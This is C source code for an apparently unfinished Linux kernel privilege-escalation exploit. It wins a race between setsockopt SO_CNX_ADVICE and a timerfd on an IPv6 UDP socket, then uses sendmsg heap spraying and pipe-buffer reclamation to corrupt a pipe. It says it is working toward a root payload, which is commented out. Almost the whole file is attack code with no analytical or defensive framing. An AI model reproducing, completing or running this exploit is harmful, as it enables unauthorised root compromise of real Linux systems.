// #include <bits/time.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <string.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <root_payload.h>

typedef uint64_t u64;
typedef int64_t i64;
typedef uint32_t u32;
typedef int32_t i32;
typedef uint16_t u16;
typedef int16_t i16;
typedef uint8_t u8;
typedef int8_t i8;

typedef size_t usize;

#define LOG(fmt, ...) do { \
    printf(fmt "\n", ##__VA_ARGS__); \
} while(0)

#define SYSCHK(x) ({                  \
    __typeof__(x) __res = (x);          \
    if (__res == (__typeof__(x))-1) {   \
        LOG("SYSCHK(" #x ") = %d\n", __res);\
        int error_val = errno;            \
        LOG("errno: %d\n", error_val);    \
        exit(1);                          \
    }                                   \
    __res;                              \
})

#define CHECK(x, n) ({                  \
    __typeof__(x) __res = (x);          \
    if (__res != n) {   \
        LOG("SYSCHK(" #x ") = %d\n", __res);\
        int error_val = errno;            \
        LOG("errno: %d\n", error_val);    \
        exit(1);                          \
    }                                   \
    __res;                              \
})

void panic(const char *msg) {
    puts(msg);
    exit(1);
}

int pin_thread_to_cpu(pid_t pid, int cpu) {
    int rc;
    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    cpu_set_t *cpu_setp = CPU_ALLOC(num_cpus);
    size_t size = CPU_ALLOC_SIZE(num_cpus);
    CPU_ZERO_S(size, cpu_setp);
    if (cpu >= 0 && cpu < num_cpus) {
        CPU_SET_S(cpu, size, cpu_setp);
    } else {
        for (int i = 0; i < num_cpus; i++) {
            CPU_SET_S(i, size, cpu_setp);
        }
    }

    rc = sched_setaffinity(pid, size, cpu_setp);
    // if (rc) {
    //     printf("cpu %d failed to be pinned (num cpus = %d)\n", cpu, num_cpus);
    //     perror("sched_setaffinity");
    // }
    CPU_FREE(cpu_setp);
    return rc;
}

int pin_to_cpu(int cpu) {
    return pin_thread_to_cpu(0, cpu);
}

void make_thread_idle() {
    struct sched_param param;

    memset(&param, 0, sizeof(param));
    SYSCHK(sched_setscheduler(0, SCHED_IDLE, &param));
}

u64 now_ns() {
    struct timespec ts;

    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));

    return (u64)ts.tv_sec * 1000000000ull + (u64)ts.tv_nsec;
}

static struct timespec ns_to_timespec(u64 ns) {
    struct timespec ts;

    ts.tv_sec = (time_t)(ns / 1000000000ull);
    ts.tv_nsec = (long)(ns % 1000000000ull);
    return ts;
}


typedef struct {
    int read_fd;
    int write_fd;
} Pipe;

Pipe open_pipe() {
    int fds[2] = { 0 };
    SYSCHK(pipe(fds));
    Pipe pipe = {
        .read_fd = fds[0],
        .write_fd = fds[1],
    };
    return pipe;
}

void pipe_close(Pipe *pipe) {
    SYSCHK(close(pipe->read_fd));
    SYSCHK(close(pipe->write_fd));
}

void pipe_set_buf_size(Pipe *pipe, usize size) {
    CHECK(fcntl(pipe->write_fd, F_SETPIPE_SZ, size), size);
}

void pipe_prefault(Pipe *pipe) {
    u8 buf = 0;
    SYSCHK(write(pipe->write_fd, &buf, sizeof(buf)));
    CHECK(read(pipe->read_fd, &buf, sizeof(buf)), sizeof(buf));
}

#define NUM_SPRAY 0x400
#define SPRAY_SIZE 0x100

// sendmsg spray adapted from CVE-2023-3609 exploit
// payload to send on socket
u8 dummy_buf[0x1000] = { 0 };

// payload sprayed to overlap with
u8 payload[SPRAY_SIZE] = { 0 };

int control_socket[2] = { 0 };
int spray_sockets[NUM_SPRAY][2] = { 0 };


void *spray_thread(void *x) {
    size_t index = (size_t)x;
    write(control_socket[0], dummy_buf, 1);
    read(control_socket[0], dummy_buf, 1);
    pin_to_cpu(0);

    struct iovec iov = {
        .iov_base = dummy_buf,
        .iov_len = sizeof(dummy_buf),
    };

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = sizeof(payload),
    };

    sendmsg(spray_sockets[index][1], &msg, 0);

    // we only spray once for now, and never exit
    for (;;) {
        sleep(1000);
    }

    return NULL;
}

void setup_spray() {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, control_socket));

    memset(payload, 0, sizeof(payload));
    memset(dummy_buf, 0, sizeof(dummy_buf));

    struct cmsghdr *control_header = (struct cmsghdr *) &payload[0];
    control_header->cmsg_len = sizeof(payload);
    control_header->cmsg_level = 0;
    control_header->cmsg_type = 0;

    for (usize i = 0; i < NUM_SPRAY; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]));

        u32 buf_size = 0x800;
        SYSCHK(setsockopt(spray_sockets[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&buf_size, sizeof(buf_size)));
        SYSCHK(setsockopt(spray_sockets[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&buf_size, sizeof(buf_size)));
        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
    }

    pthread_t tid = 0;
    for (usize i = 0; i < NUM_SPRAY; i++) {
        pthread_create(&tid, 0, spray_thread, (void *)i);
        pthread_detach(tid);
    }

    // wait for threads to get setup
    int to_read = NUM_SPRAY;
    while (to_read > 0) {
        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
    }
}

void do_spray() {
    write(control_socket[1], dummy_buf, NUM_SPRAY);
    // wait for spray to finish
    // cant really use barrier cause threads will indefinately block in sendmsg
    // so they can't signal after they are done
    sleep(1);
}

// cleans up resrouces used during spray
void reset_spray() {
    for (usize i = 0; i < NUM_SPRAY; i++) {
        read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf));
        // SYSCHK(close(spray_sockets[i][0]));
        // SYSCHK(close(spray_sockets[i][1]));
    }

    // SYSCHK(close(control_socket[0]));
    // SYSCHK(close(control_socket[1]));
}

int open_connected_ipv6_udp_socket() {
    int socket_fd = SYSCHK(socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP));

    struct sockaddr_in6 addr = { 0 };
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(1337);
    SYSCHK(inet_pton(AF_INET6, "::1", &addr.sin6_addr));

    SYSCHK(connect(socket_fd, (struct sockaddr*)&addr, sizeof(addr)));

    return socket_fd;
}

void open_many_sockets(int *fd_array, usize len) {
    for (usize i = 0; i < len; i++) {
        fd_array[i] = open_connected_ipv6_udp_socket();
    }
}

void close_fds(int *fd_array, usize len) {
    for (usize i = 0; i < len; i++) {
        SYSCHK(close(fd_array[i]));
    }
}

/////////////////////////////
//// Trigger Logic       ////
/////////////////////////////


#define NUM_PAGE_PIPES 0x600
#define NUM_VULN_PIPES 0x20
#define NUM_PRE_SOCKETS 1024
#define NUM_POST_SOCKETS 1024

typedef struct {
    atomic_int ready_counter;
    // atomic_int timer_wakeup;
    int timer_fd;
    atomic_int vuln_socket;
    int pre_sockets[NUM_PRE_SOCKETS];
    int post_sockets[NUM_POST_SOCKETS];
    atomic_int trigger_thread;
    Pipe sync_pipe_to_trigger;
    u64 timer_offset;
} TriggerCtx;

void *run_cpu1_block_thread(void *arg) {
    pin_to_cpu(1);

    TriggerCtx *ctx = (TriggerCtx *) arg;
    atomic_fetch_add(&ctx->ready_counter, 1);

    // busy loop forever
    for (;;) {}
}

void *run_trigger_thread(void *arg) {
    TriggerCtx *ctx = (TriggerCtx *) arg;
    atomic_store(&ctx->trigger_thread, syscall(SYS_gettid));

    pin_to_cpu(0);
    make_thread_idle();

    // retry race in loop
    for (;;) {
        // wait with pipe, needed also because timer could fire in weird spots
        // where ready counter is still 2
        u8 buf = 0;
        SYSCHK(read(ctx->sync_pipe_to_trigger.read_fd, &buf, sizeof(buf)));

        // wait for other threads to be ready
        while (atomic_load(&ctx->ready_counter) < 2) {}

        // ensure we are on cpu 0 (should already be done)
        pin_to_cpu(0);

        // wait a bit more just in case
        // for (usize i = 0; i < 1024 * 1024; i++) {}

        // read socket fd before setting timer, if timer expires before setsockopt main thread might change socket
        int socket_fd = atomic_load(&ctx->vuln_socket);

        // arm timer
        struct itimerspec spec = { 0 };
        spec.it_value = ns_to_timespec(now_ns() + ctx->timer_offset);
        SYSCHK(timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL));

        int one = 1;
        // don't check result, socket might be closed
        setsockopt(socket_fd, SOL_IPV6, SO_CNX_ADVICE, &one, sizeof(one));
    }
}

void try_run_main_exploit(TriggerCtx *ctx);

void trigger_vuln_loop() {
    pthread_t cpu1_block_thread = { 0 };
    pthread_t trigger_thread = { 0 };

    TriggerCtx ctx = {
        .ready_counter = 0,
        .timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC)),
        .vuln_socket = 0,
        .pre_sockets = { 0 },
        .post_sockets = { 0 },
        .trigger_thread = 0,
        .sync_pipe_to_trigger = open_pipe(),
        .timer_offset = 240000,
    };

    // this thread will spin on cpu1 forever
    SYSCHK(pthread_create(&cpu1_block_thread, NULL, run_cpu1_block_thread, (void *) &ctx));

    // create the trigger thread
    SYSCHK(pthread_create(&trigger_thread, NULL, run_trigger_thread, (void *) &ctx));

    // wait for trigger thread tid to become available
    while (atomic_load(&ctx.trigger_thread) == 0) {}
    pid_t trigger_pid = atomic_load(&ctx.trigger_thread);

    usize iteration_count = 0;
    usize too_long_count = 0;

    // spray sockets for setup
    open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
    ctx.vuln_socket = open_connected_ipv6_udp_socket();
    open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);

    for (;;) {
        // adjust timerfd timing based on previous runs
        if (iteration_count == 5) {
            if (too_long_count == 5) {
                ctx.timer_offset -= 2000;
                LOG("Decrease time window to: %ll", ctx.timer_offset);
            } else if (too_long_count == 0) {
                // being too short is much more expensive
                ctx.timer_offset += 20000;
                LOG("Increase time window to: %ll", ctx.timer_offset);
            }
            // if there was a mix of too long and too short, we will eventually hit the race probably

            iteration_count = 0;
            too_long_count = 0;
        }

        // let trigger know it can continue another iteration
        u8 buf = 0;
        SYSCHK(write(ctx.sync_pipe_to_trigger.read_fd, &buf, sizeof(buf)));

        // sets up trigger thread to run and trigger exploit
        pin_thread_to_cpu(trigger_pid, 0);

        // trigger actual exploit (will context switch to trigger thread)
        atomic_fetch_add(&ctx.ready_counter, 1);
        u64 result = 0;
        SYSCHK(read(ctx.timer_fd, &result, sizeof(result)));
        atomic_fetch_sub(&ctx.ready_counter, 1); // no longer ready

        // move trigger thread to cpu, so we can sleep and such and not worry about blocking
        pin_thread_to_cpu(trigger_pid, 1);

        iteration_count += 1;

        int mtu = 0;
        socklen_t mtu_len = sizeof(mtu);
        if (getsockopt(ctx.vuln_socket, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len) == -1) {
            // race failed: too long
            too_long_count += 1;

            // reset just the vuln socket, sprayed sockets don't need to be reset
            SYSCHK(close(ctx.vuln_socket));
            ctx.vuln_socket = open_connected_ipv6_udp_socket();

            continue;
        }

        // try exploit: race may or may not have succeeded
        // doesn't seem like a cheap way to see if race suceeded other then doing the exploit
        // there may be an option which requires a remote server
        try_run_main_exploit(&ctx);

        // if we returned, setup sockets for retry
        open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
        ctx.vuln_socket = open_connected_ipv6_udp_socket();
        open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);
    }
}

// returns on failure, should be retried
void try_run_main_exploit(TriggerCtx *ctx) {
    Pipe page_pipes[NUM_PAGE_PIPES] = { 0 };
    Pipe vuln_pipes[NUM_VULN_PIPES] = { 0 };

    setup_spray();

    // setup page pipes to have 1 pipe buffer entry with 1 backing page, but don't prefault
    for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
        page_pipes[i] = open_pipe();
        pipe_set_buf_size(&page_pipes[i], 0x1000);
    }

    // initially put vuln pipes in smaller cache
    for (usize i = 0; i < NUM_VULN_PIPES; i++) {
        vuln_pipes[i] = open_pipe();
        pipe_set_buf_size(&vuln_pipes[i], 0x1000);
        pipe_prefault(&vuln_pipes[i]);

        // not sure if this write is needed
        // just copied from bad io uring structure
        u8 buf = 0;
        write(vuln_pipes[i].write_fd, &buf, sizeof(buf));
    }

    // close many sockets, hopefully buddy allocator reclaims backing page
    close_fds(ctx->pre_sockets, NUM_PRE_SOCKETS);
    close_fds(ctx->post_sockets, NUM_POST_SOCKETS);

    // TODO: setup payload we want to spray
    // after spray, dst_cache hopefully reclaimed
    do_spray();

    // now write/send should trigger 'invalid' dst_cache route to be released
    u8 buf = 0;
    SYSCHK(write(ctx->vuln_socket, &buf, sizeof(buf)));

    // change vuln pipe buffer to put them in kmalloc-256
    // will hopefully cause pipe to fill freed slot in sprayed object
    for (usize i = 0; i < NUM_VULN_PIPES; i++) {
        pipe_set_buf_size(&vuln_pipes[i], 4 * 0x1000);
    }

    // trigger all sprayed objects to be freed
    // will trigger a page with vuln pipe to be freed
    reset_spray();

    // attempt to reclaim vuln pipe with another pipe backing page
    u8 buf2[0x1000] = { 0 };
    memset(buf2, 'A', sizeof(buf2));
    for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
        write(page_pipes[i].write_fd, buf2, sizeof(buf2));
    }

    // find corrupted pipe
    int bad_index = -1;
    for (int i = 0; i < NUM_VULN_PIPES; i++) {
        int size = 0;
        ioctl(vuln_pipes[i].write_fd, FIONREAD, &size);
        if (size == 0x41414141) {
            bad_index = i;
            break;
        }
    }

    if (bad_index == -1) {
        // will retry exit after failure
        LOG("FAIL: could not corrupt pipe");

        // close all resources used in exploit
        for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
            pipe_close(&page_pipes[i]);
        }

        for (usize i = 0; i < NUM_VULN_PIPES; i++) {
            pipe_close(&vuln_pipes[i]);
        }

        SYSCHK(close(ctx->vuln_socket));

        return;
    }

    // at this point, exploit has succeeded
    Pipe exp_pipe = vuln_pipes[bad_index];

    LOG("found corrupted pipe FIONREAD");

    // root_payload();

    while (1) {
        sleep(1000);
    }
}

int main() {
    puts("Starting exploit...");

    pin_to_cpu(0);

    trigger_vuln_loop();

    return 0;
}
